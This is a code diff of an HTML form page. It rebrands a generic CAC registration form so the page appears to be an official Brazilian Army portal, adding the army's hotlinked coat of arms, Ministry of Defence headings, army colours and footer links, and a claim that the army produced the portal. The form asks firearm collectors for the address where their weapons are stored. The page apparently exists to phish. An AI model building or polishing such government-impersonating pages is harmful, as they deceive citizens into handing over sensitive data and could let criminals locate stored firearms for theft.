@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Portal de Cadastro - CAC</title>
+    <title>Exército Brasileiro - Cadastro para Armazenamento de Armas CAC</title>
     
     <style>
         @keyframes is-rotating {
@@ -49,7 +49,11 @@
     <header class="bg-white border-b border-gray-300">
         <div class="container mx-auto px-4 py-2">
             <div class="flex items-center">
-                 <div class="font-bold text-gray-800">Portal de Cadastro CAC</div>
+                <img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372" width="40">
+                <div>
+                    <div class="text-sm text-green-800">Ministério da Defesa</div>
+                    <div class="font-bold text-green-800">Exército Brasileiro</div>
+                </div>
             </div>
         </div>
     </header>
@@ -57,29 +61,31 @@
     <nav class="bg-gray-200 py-2 overflow-x-auto">
         <div class="container mx-auto px-4">
             <div class="flex items-center text-sm whitespace-nowrap">
-                <a class="text-gray-800 mr-2" href="#">Início</a>
+                <a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
                 <span class="text-gray-500 mx-1">&gt;</span>
-                <a class="text-gray-800 mr-2" href="#">Serviços</a>
+                <a class="text-green-800 mr-2" href="#">Serviços</a>
                 <span class="text-gray-500 mx-1">&gt;</span>
-                <span class="text-gray-700">Endereço</span>
+                <a class="text-green-800 mr-2" href="#">CAC</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <span class="text-gray-700">Armazenamento</span>
             </div>
         </div>
     </nav>
 
     <main class="container mx-auto px-4 py-8">
-        <h1 class="text-2xl font-bold mb-4">Cadastro de Endereço - CAC</h1>
-        <p class="mb-4">Por favor, preencha o formulário abaixo com as informações de endereço solicitadas.</p>
-        <p class="mb-4 font-bold text-red-600">Atenção: Certifique-se de que os dados informados estejam corretos.</p>
-        <p class="mb-8">Todos os campos marcados com * são obrigatórios. Comece inserindo o CEP para preenchimento automático.</p>
+        <h1 class="text-2xl font-bold mb-4">Cadastro para Armazenamento de Armas - CAC</h1>
+        <p class="mb-4">Por favor, preencha o formulário abaixo com o endereço onde as armas serão armazenadas. Este endereço deve ser o local seguro e adequado para o armazenamento das armas, conforme as regulamentações do Exército Brasileiro.</p>
+        <p class="mb-4 font-bold text-red-600">Atenção: O endereço fornecido será o local oficial de armazenamento das armas registradas em seu certificado CAC.</p>
+        <p class="mb-8">Todos os campos marcados com * são obrigatórios. Comece inserindo o CEP para preenchimento automático dos outros campos.</p>
         
         <form id="endereco-form" onsubmit="salvarDados(); return false;">
             <div class="mb-4">
-                <label class="block text-gray-700 text-sm font-bold mb-2" for="cep">CEP *</label>
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="cep">CEP do Local de Armazenamento *</label>
                 <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cep" type="text" inputmode="numeric" placeholder="00000-000" maxlength="9" pattern="[0-9]{5}-[0-9]{3}" autocomplete="postal-code" aria-describedby="cep-status" required="">
                 <p id="cep-status" class="text-sm text-gray-600 mt-2" role="status" aria-live="polite"></p>
             </div>
             <div class="mb-4">
-                <label class="block text-gray-700 text-sm font-bold mb-2" for="logradouro">Logradouro *</label>
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="logradouro">Logradouro do Local de Armazenamento *</label>
                 <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="logradouro" type="text" placeholder="Rua, Avenida, etc." required="">
             </div>
             <div class="mb-4">
@@ -102,8 +108,8 @@
                 <label class="block text-gray-700 text-sm font-bold mb-2" for="estado">Estado *</label>
                 <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="estado" type="text" placeholder="Estado" required="">
             </div>
-            <p class="text-sm mb-4">Ao clicar no botão "Prosseguir", você declara que todas as informações fornecidas são verdadeiras e está ciente dos termos de uso.</p>
-            <button class="bg-blue-800 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
+            <p class="text-sm mb-4">Ao clicar no botão "Prosseguir", você declara que todas as informações fornecidas são verdadeiras, que o endereço informado é o local onde as armas serão armazenadas, e que está ciente das responsabilidades legais associadas ao registro de CAC e ao armazenamento seguro de armas, conforme estabelecido pela Lei nº 10.826/2003 (Estatuto do Desarmamento) e suas regulamentações.</p>
+            <button class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
                 Prosseguir
             </button>
         </form>
@@ -125,14 +131,14 @@
         </script>
     </main>
 
-    <footer class="bg-gray-800 text-white py-8">
+    <footer class="bg-green-900 text-white py-8">
         <div class="container mx-auto px-4">
             <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
                 <div>
-                    <h3 class="font-bold mb-2">INSTITUCIONAL</h3>
+                    <h3 class="font-bold mb-2">O EXÉRCITO</h3>
                     <ul class="text-sm">
-                        <li><a class="hover:underline" href="#">Sobre Nós</a></li>
-                        <li><a class="hover:underline" href="#">Missão</a></li>
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
                         <li><a class="hover:underline" href="#">Organização</a></li>
                         <li><a class="hover:underline" href="#">História</a></li>
                     </ul>
@@ -140,16 +146,16 @@
                 <div>
                     <h3 class="font-bold mb-2">SERVIÇOS</h3>
                     <ul class="text-sm">
-                        <li><a class="hover:underline" href="#">Cadastro</a></li>
-                        <li><a class="hover:underline" href="#">Consultas</a></li>
-                        <li><a class="hover:underline" href="#">Suporte</a></li>
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Concursos</a></li>
                     </ul>
                 </div>
                 <div>
                     <h3 class="font-bold mb-2">TRANSPARÊNCIA</h3>
                     <ul class="text-sm">
                         <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
-                        <li><a class="hover:underline" href="#">Termos de Uso</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
                     </ul>
                 </div>
                 <div>
@@ -171,8 +177,8 @@
             </div>
         </div>
     </footer>
-    <div class="bg-gray-900 text-white text-xs py-2 text-center">
-        Portal de Cadastro - Todos os Direitos Reservados.
+    <div class="bg-green-950 text-white text-xs py-2 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
     </div>
 
     <script>
@@ -197,7 +203,6 @@
                 ultimoCep = cep;
                 if (consulta) consulta.abort();
 
-                // Limpa apenas dados da consulta anterior que não foram editados.
                 preenchidos.forEach((valor, id) => {
                     const campo = document.getElementById(id);
                     if (campo.value === valor) campo.value = '';
@@ -227,7 +232,6 @@
                     Object.entries(campos).forEach(([id, chave]) => {
                         const campo = document.getElementById(id);
                         const valor = typeof data[chave] === 'string' ? data[chave].trim() : '';
-                        // Preserva informações digitadas enquanto a consulta estava em andamento.
                         if (valor && campo.value === valoresIniciais[id]) {
                             campo.value = valor;
                             preenchidos.set(id, valor);
